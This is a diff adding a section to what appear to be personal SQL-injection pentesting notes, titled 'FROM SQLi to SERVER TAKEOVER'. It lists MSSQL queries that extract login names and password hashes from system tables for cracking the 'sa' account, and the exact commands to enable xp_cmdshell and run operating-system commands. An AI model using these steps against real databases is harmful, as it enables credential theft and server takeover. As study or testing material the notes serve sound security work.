@@ -440,6 +440,35 @@ you can reduce the dumping time using parallel threads with the following flag: 
 .. input validation
 .. type casting
 
+....> FROM SQLi to SERVER TAKEOVER
+
+engines: MS SQL & MySQL
+
+the first testing objective is to retrieve the "sa" user password. once we have the SHA-1 hash of the password, it can be crack it.
+
+two queries to retrieve username & password hash
+
+SELECT name, password FROM master..sysxlogins -----> for MSSQL Server 2000
+
+SELECT name, password_hash FROM master..sys.sql_logins -----> for MSSQL Server >= 2005
+
+the "sa" user has complete control over the DBMS, the databases it contains and... advanced features. useful stored procedure: xp_cmdshell (NOT ALWAYS ENABLED DEFAULT & REQUIRE PRIVILEGES) so once we got "sa" we can enable it
+
+following syntax to run any OS command: EXEC master..xp_cmdshell '<command>'
+
+...> enable xp_cmdshell
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+...> disable xp_cmdshell
+
+EXEC sp_configure 'xp_cmdshell', 0;
+EXEC sp_configure 'show advanced options', 0;
+RECONFIGURE;
+
 
 </center>
 </body>
